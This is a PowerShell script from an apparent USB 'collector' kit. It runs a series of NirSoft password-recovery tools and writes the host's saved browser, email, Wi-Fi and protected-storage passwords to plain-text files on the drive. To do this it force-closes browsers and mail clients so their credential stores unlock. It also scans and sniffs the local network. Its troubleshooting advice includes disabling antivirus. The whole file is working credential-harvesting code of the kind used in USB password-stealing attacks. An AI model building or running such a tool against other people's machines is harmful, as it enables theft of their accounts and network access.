# collector.ps1
# Usage: invoked from start.bat (double-click) or run manually
# The script saves outputs into USB_ROOT\results\<timestamp>\

param(
    [switch]$ZipResults
)

$ErrorActionPreference = 'Continue'

# Folder where this script lives -> scripts\
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition
# USB root = parent of scripts\
$usbRoot = (Get-Item "$scriptFolder\..").FullName

$toolsDir = Join-Path $usbRoot 'tools'
$resultsRoot = Join-Path $usbRoot 'results'

Write-Host "USB Root: $usbRoot" -ForegroundColor Cyan
Write-Host "Tools Dir: $toolsDir" -ForegroundColor Cyan
Write-Host "Results Root: $resultsRoot" -ForegroundColor Cyan
Write-Host ""

# Create results folder if it doesn't exist
if (-not (Test-Path $resultsRoot)) {
    New-Item -ItemType Directory -Path $resultsRoot -Force | Out-Null
    Write-Host "Created results folder" -ForegroundColor Green
}

# Create timestamp folder
$timeStamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
$dest = Join-Path $resultsRoot $timeStamp
New-Item -ItemType Directory -Path $dest -Force | Out-Null
Write-Host "Created output folder: $dest" -ForegroundColor Green
Write-Host ""

# Log file
$log = Join-Path $dest 'collector.log'
"Collector started: $(Get-Date)" | Out-File -FilePath $log -Encoding utf8

function Log {
    param([string]$text)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $text"
    $line | Out-File -FilePath $log -Append -Encoding utf8
    Write-Host $line
}

function Run-Tool {
    param(
        [string]$exe,        # EXE filename located in tools\
        [string]$outfile,    # Output filename (just the filename, not full path)
        [string]$saveParam = "/stext",  # Save parameter type
        [int]$timeoutSec = 30,  # Max wait before forcing close. Sniffer-class tools may need >30s.
        [string[]]$extraArgs = @()  # Extra CLI args appended AFTER the save param (e.g., '/CaptureTime 10'). Default empty array = none.
    )
    
    $exePath = Join-Path $toolsDir $exe
    $outPath = Join-Path $dest $outfile
    
    if (-not (Test-Path $exePath)) {
        Write-Host "MISSING: $exe not found in tools folder" -ForegroundColor Red
        Log "MISSING: $exePath"
        return
    }
    
    try {
        Write-Host "Running: $exe..." -ForegroundColor Yellow
        Log "RUNNING: $exe -> $outfile"
        
        # Build full arguments - using /scomma tends to work better for auto-save.
        # Extra args (e.g., /CaptureTime 10) are appended as-is with single-space separator.
        $fullArgs = "$saveParam `"$outPath`""
        if ($extraArgs -and $extraArgs.Count -gt 0) {
            $fullArgs += ' ' + ($extraArgs -join ' ')
        }
        
        Write-Host "  Command: $exe $fullArgs" -ForegroundColor DarkGray
        
        # Method 1: Try direct execution with output redirect
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exePath
        $psi.Arguments = $fullArgs
        $psi.CreateNoWindow = $false  # Allow window to appear briefly
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
        $psi.UseShellExecute = $false
        
        # Start process
        $proc = [System.Diagnostics.Process]::Start($psi)
        
        # Wait up to $timeoutSec ms for the process to complete. Browser/email
        # password tools can take longer than 30s; sniffer-class tools can
        # need 60s+ of warm-up before the first packet is captured.
        $completed = $proc.WaitForExit($timeoutSec * 1000)

        if (-not $completed) {
            Write-Host "  WARNING: Still running after $timeoutSec seconds, forcing close..." -ForegroundColor Yellow
            $proc.Kill()
            $proc.WaitForExit(2000)
        }
        
        # Give it a moment for file to be written
        Start-Sleep -Milliseconds 1000
        
        # Check if output file was created
        if (Test-Path $outPath) {
            $fileSize = (Get-Item $outPath).Length
            if ($fileSize -gt 10) {
                Write-Host "  ✅ SUCCESS: Created $fileSize bytes" -ForegroundColor Green
                Log "SUCCESS: $exe -> $outfile (Size: $fileSize bytes)"
            } else {
                Write-Host "  ⚠️ WARNING: File created but empty (no data found)" -ForegroundColor Yellow
                Log "WARNING: $exe created empty/minimal file at $outPath"
            }
        } else {
            Write-Host "  ❌ FAILED: No output file created" -ForegroundColor Red
            Write-Host "     Hint: this is usually the 'limited nirsoft.net build' with CLI-save" -ForegroundColor Gray
            Write-Host "     disabled. Replace .exe with the all-in-one zip from" -ForegroundColor Gray
            Write-Host "     https://www.nirsoft.net/password_recovery_tools.html" -ForegroundColor Gray
            Log "FAILED: $exe completed but no output file at $outPath"
        }
        
    } catch {
        Write-Host "  ❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
        Log "ERROR running ${exe}: $($_.Exception.Message)"
    }
    
    Write-Host ""
}

# --------------------
# List of NirSoft tools to run
# --------------------

# Pre-close browser and email processes so their locked SQLite/credential
# databases are released. ChromePass, PasswordFox, mailpv and
# WebBrowserPassView all need to read DB files that running browsers/email
# clients hold open with mandatory locks; without this step those tools
# either hang or fall back to a manual GUI prompt.
$appsToClose = @('chrome', 'msedge', 'firefox', 'opera', 'brave', 'vivaldi', 'thunderbird', 'outlook')
$closedTotal = 0
foreach ($app in $appsToClose) {
    $running = Get-Process -Name $app -ErrorAction SilentlyContinue
    if ($running) {
        Write-Host "Closing $app ($($running.Count) process(es)) to release file locks..." -ForegroundColor DarkYellow
        $running | Stop-Process -Force -ErrorAction SilentlyContinue
        $closedTotal += $running.Count
    }
}
if ($closedTotal -gt 0) {
    Write-Host "Closed $closedTotal process(es); waiting 2s for file locks to release..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

Log "Starting password collection..."
Write-Host "==================== Collecting Data ====================" -ForegroundColor Cyan
Write-Host "NOTE: Using /stext for plain-text .txt output across all tools" -ForegroundColor Cyan
Write-Host ""

# All outputs are saved as plain-text via /stext (NirSoft CLI save) for human readability
# and easy grep. Earlier revisions used /scomma (CSV) for some tools; user standardized
# on /stext which every active tool here supports.

# ChromePass - Chrome passwords
Run-Tool -exe 'ChromePass.exe' -outfile 'ChromePass.txt' -saveParam '/stext'

# WirelessKeyView MUST run as admin  
Run-Tool -exe 'WirelessKeyView.exe' -outfile 'wifi_keys.txt' -saveParam '/stext'

# WebBrowserPassView - supports multiple browsers
Run-Tool -exe 'WebBrowserPassView.exe' -outfile 'browser_passwords.txt' -saveParam '/stext'

# Mail PassView - email passwords
Run-Tool -exe 'mailpv.exe' -outfile 'MailPass.txt' -saveParam '/stext'

# Opera PassView - Opera browser
Run-Tool -exe 'OperaPassView.exe' -outfile 'OperaPass.txt' -saveParam '/stext'

# PasswordFox - Firefox passwords
Run-Tool -exe 'PasswordFox.exe' -outfile 'PasswordFox.txt' -saveParam '/stext'

# ---------------------------------------------------------------------------
# Additional NirSoft tools (validated via scripts\test-tools-cli.ps1)
# Probed both /scomma and /stext; only entries that exited cleanly AND wrote
# the output file on this build of tools\ are listed below. Note that the user
# has now standardized on /stext everywhere — /stab is also widely supported
# if a downstream parser needs tab-delimited input.
# ---------------------------------------------------------------------------

# BulletsPassView - saved passwords from Mozilla / Thunderbird / Netscape / old Communicator
Run-Tool -exe 'BulletsPassView.exe' -outfile 'bullets_pass.txt' -saveParam '/stext'

# ManageWirelessNetworks - structured Wi-Fi profile dump (netsh wlan show profile)
Run-Tool -exe 'ManageWirelessNetworks.exe' -outfile 'wifi_profiles.txt' -saveParam '/stext'

# UninstallView - list of installed programs (HKLM + HKCU)
Run-Tool -exe 'UninstallView.exe' -outfile 'installed_programs.txt' -saveParam '/stext'

# UserProfilesView - Windows user profile information
Run-Tool -exe 'UserProfilesView.exe' -outfile 'user_profiles.txt' -saveParam '/stext'

# pspv - Protected Storage (legacy Outlook / IE). Often empty on modern systems
#        so the run will typically be flagged as WARNING (file size <= 10 bytes).
Run-Tool -exe 'pspv.exe' -outfile 'protected_storage.txt' -saveParam '/stext'

# NetBScanner - LAN network scanner (IP / MAC / computer name from ARP cache + scan)
Run-Tool -exe 'NetBScanner.exe' -outfile 'network_scan.txt' -saveParam '/stext'

# WhoIsConnectedSniffer - passive ARP sniffer (who is connected to your LAN/Wi-Fi).
#                         Requires Npcap driver (npf.sys). If Npcap is missing, the tool
#                         hangs at driver-bind even with /CaptureTime 10, since the
#                         capture never starts. We detect npf.sys upfront and skip
#                         gracefully in that case; NetBScanner above already covers
#                         active LAN discovery without needing Npcap.
$whoIsNeedsNpcap = Test-Path -LiteralPath 'C:\Windows\System32\drivers\npf.sys'
if ($whoIsNeedsNpcap) {
    Run-Tool -exe 'WhoIsConnectedSniffer.exe' -outfile 'connected_devices.txt' -saveParam '/stext' -timeoutSec 25 -extraArgs @('/CaptureTime', '10')
} else {
    Write-Host "  -> Npcap driver (npf.sys) not found: skipping WhoIsConnectedSniffer (it's a passive sniffer that needs Npcap). NetBScanner already gives you active LAN scan; install Npcap from https://nmap.org/npcap/ if you also need passive sniffing." -ForegroundColor Yellow
    Log "SKIPPED: WhoIsConnectedSniffer (Npcap driver not installed)"
}

# Probed but CLI save did NOT complete within the 10s timeout. Most likely
# cause: these tools read SYSTEM-scoped data (Credential Manager / DPAPI blobs /
# registry hives) and need an elevated PowerShell session to operate headless,
# so the probe (which ran non-elevated) kept them waiting on an invisible
# permission prompt. Re-run scripts\test-tools-cli.ps1 from an elevated shell
# to confirm; or replace each .exe with the "all-in-one" build from
# https://www.nirsoft.net/password_recovery_tools.html which includes full
# CLI-save support. Note: only /scomma and /stext are probed by default;
# some tools also support /shtml, /sxml, /stab.
#   - CredentialsFileView.exe
#   - DataProtectionDecryptor.exe
#   - ProductKeyScanner.exe

Write-Host ""
Write-Host "==================== Summary ====================" -ForegroundColor Cyan

# List all created files
$createdFiles = Get-ChildItem -Path $dest -File | Where-Object { $_.Name -ne 'collector.log' }
if ($createdFiles.Count -gt 0) {
    Write-Host "Files created:" -ForegroundColor Green
    $totalSize = 0
    $successCount = 0
    foreach ($file in $createdFiles) {
        $size = $file.Length
        $totalSize += $size
        if ($size -gt 10) {
            Write-Host "  ✅ $($file.Name) ($size bytes)" -ForegroundColor Green
            $successCount++
        } else {
            Write-Host "  ⚠️ $($file.Name) ($size bytes - empty/no data)" -ForegroundColor Yellow
        }
    }
    Write-Host ""
    Write-Host "Summary: $successCount file(s) with data, Total size: $totalSize bytes" -ForegroundColor Cyan
} else {
    Write-Host "❌ No output files were created" -ForegroundColor Red
    Write-Host ""
    Write-Host "Troubleshooting tips:" -ForegroundColor Yellow
    Write-Host "  1. Run test-tools.bat to diagnose each tool" -ForegroundColor Gray
    Write-Host "  2. Check if you have passwords saved in these browsers" -ForegroundColor Gray
    Write-Host "  3. Temporarily disable antivirus and try again" -ForegroundColor Gray
    Write-Host "  4. Make sure running as Administrator" -ForegroundColor Gray
}

Write-Host ""
Write-Host "Results saved to: $dest" -ForegroundColor Green

# Optional: compress results
if ($ZipResults) {
    try {
        $zipfile = Join-Path $resultsRoot ("results_$timeStamp.zip")
        Compress-Archive -Path (Join-Path $dest '*') -DestinationPath $zipfile -Force
        Write-Host "Compressed to: $zipfile" -ForegroundColor Green
        Log "ZIPPED -> $zipfile"
    } catch {
        Write-Host "ZIP FAILED: $($_.Exception.Message)" -ForegroundColor Red
        Log "ZIP FAILED: $($_.Exception.Message)"
    }
}

Log "Collector finished: $(Get-Date)"
Write-Host ""
Write-Host "Collection complete!" -ForegroundColor Green
# Skip the final pause when stdin is redirected (headless / piped runs)
# or when COLLECTOR_SKIP_PAUSE is set, so the script never hangs on keypress
# during automated runs. Interactive use is unchanged.
if (-not [Console]::IsInputRedirected -and -not $env:COLLECTOR_SKIP_PAUSE) {
    Write-Host "Press any key to exit..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}